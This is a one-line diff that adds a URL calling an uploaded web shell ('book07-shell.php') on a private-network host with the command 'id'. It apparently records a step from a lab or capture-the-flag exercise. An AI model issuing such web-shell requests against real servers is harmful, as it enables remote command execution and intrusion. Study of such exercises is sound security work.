@@ -1,0 +1,1 @@
+http://192.168.0.189/uploads/book07-shell.php?cmd=id
